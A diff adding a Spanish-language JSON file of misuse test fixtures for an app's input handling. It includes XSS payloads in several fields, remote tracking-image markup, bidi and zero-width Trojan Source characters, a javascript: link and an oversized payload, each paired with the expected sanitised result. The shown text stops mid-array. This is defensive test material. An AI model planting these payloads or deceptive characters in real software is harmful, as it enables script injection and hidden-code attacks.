@@ -1,0 +1,3567 @@
+{
+  "_nota": "Objetos CRUDOS pensados para romper el contrato (MU-01..12, MVP 2026-11-10: 6 casos). {\"$repetir\": [texto, veces]} se expande al cargar para no versionar cientos de KB. Los caracteres enga\u00f1osos van como escapes \\uXXXX.",
+  "fixtures": [
+    {
+      "mu": "MU-01",
+      "nota": "XSS y Markdown/HTML con imagen remota (MU-11) en nombre, descripcion, licencia y lenguaje: texto literal.",
+      "crudo": {
+        "id": "mu-01-xss",
+        "nombre": "<img src=x onerror=alert(1)>",
+        "urlRepo": "https://github.com/ejemplo-sintetico/mu-01-xss",
+        "descripcion": "<script>alert(1)</script> <svg onload=alert(1)> ![p](https://rastreo.test/p.png) <img src=\"https://rastreo.test/p.gif\">",
+        "categorias": [
+          "ia"
+        ],
+        "stars": 10,
+        "ultimaActualizacion": "2026-10-01T00:00:00Z",
+        "licencia": "\"><svg onload=alert(1)>",
+        "lenguaje": "<b>negrita</b>",
+        "issuesAbiertos": 1,
+        "mantenedorActivo": true,
+        "nivelMantenimiento": "activo",
+        "healthScore": 70,
+        "metricasTomadasEn": "2026-11-09T00:00:00Z",
+        "ideas": []
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "nombre": "<img src=x onerror=alert(1)>",
+          "descripcion": "<script>alert(1)</script> <svg onload=alert(1)> ![p](https://rastreo.test/p.png) <img src=\"https://rastreo.test/p.gif\">",
+          "licencia": "\"><svg onload=alert(1)>",
+          "lenguaje": "<b>negrita</b>"
+        }
+      }
+    },
+    {
+      "mu": "MU-03",
+      "nota": "Unicode enga\u00f1oso: inversion bidi y ancho cero en el nombre, y Trojan Source en un snippet.",
+      "crudo": {
+        "id": "mu-03-bidi",
+        "nombre": "Herramienta\u202eotsum\u200b seguro",
+        "urlRepo": "https://github.com/ejemplo-sintetico/mu-03-bidi",
+        "descripcion": "Caso de mal uso.",
+        "categorias": [
+          "ia"
+        ],
+        "stars": 10,
+        "ultimaActualizacion": "2026-10-01T00:00:00Z",
+        "licencia": "MIT",
+        "lenguaje": "TypeScript",
+        "issuesAbiertos": 1,
+        "mantenedorActivo": true,
+        "nivelMantenimiento": "activo",
+        "healthScore": 70,
+        "metricasTomadasEn": "2026-11-09T00:00:00Z",
+        "ideas": [
+          {
+            "tipo": "rest",
+            "disparadores": [
+              "al recibir un evento"
+            ],
+            "snippet": "if (esAdmin) { \u202e// }\u2066 x \u2069\n  ejecutar();\n}",
+            "stack": [
+              "node"
+            ],
+            "dificultad": "baja",
+            "revisada": false
+          }
+        ]
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "nombre": "Herramientaotsum seguro",
+          "ideas": [
+            {
+              "snippet": "if (esAdmin) { // } x \n  ejecutar();\n}"
+            }
+          ]
+        }
+      }
+    },
+    {
+      "mu": "MU-08",
+      "nota": "Enlace al repositorio malicioso: no hay enlace (null).",
+      "crudo": {
+        "id": "mu-08-enlace",
+        "nombre": "Enlace malicioso",
+        "urlRepo": "javascript:alert(1)",
+        "descripcion": "Caso de mal uso.",
+        "categorias": [
+          "ia"
+        ],
+        "stars": 10,
+        "ultimaActualizacion": "2026-10-01T00:00:00Z",
+        "licencia": "MIT",
+        "lenguaje": "TypeScript",
+        "issuesAbiertos": 1,
+        "mantenedorActivo": true,
+        "nivelMantenimiento": "activo",
+        "healthScore": 70,
+        "metricasTomadasEn": "2026-11-09T00:00:00Z",
+        "ideas": []
+      },
+      "esperado": {
+        "omitida": false,
+        "detalle": {
+          "urlRepo": null,
+          "id": "mu-08-enlace"
+        }
+      }
+    },
+    {
+      "mu": "MU-04",
+      "nota": "Payload grande: 300 KB de descripcion, 25 ideas, 500 disparadores y un snippet de 4001 caracteres.",
+      "crudo": {
+        "id": "mu-04-grande",
+        "nombre": "Payload grande",
+        "urlRepo": "https://github.com/ejemplo-sintetico/mu-04-grande",
+        "descripcion": {
+          "$repetir": [
+            "descripcion enorme ",
+            16000
+          ]
+        },
+        "categorias": [
+          "ia"
+        ],
+        "stars": 10,
+        "ultimaActualizacion": "2026-10-01T00:00:00Z",
+        "licencia": "MIT",
+        "lenguaje": "TypeScript",
+        "issuesAbiertos": 1,
+        "mantenedorActivo": true,
+        "nivelMantenimiento": "activo",
+        "healthScore": 70,
+        "metricasTomadasEn": "2026-11-09T00:00:00Z",
+        "ideas": [
+          {
+            "tipo": "rest",
+            "disparadores": [
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
+                "$repetir": [
+                  "d",
+                  500
+                ]
+              },
+              {
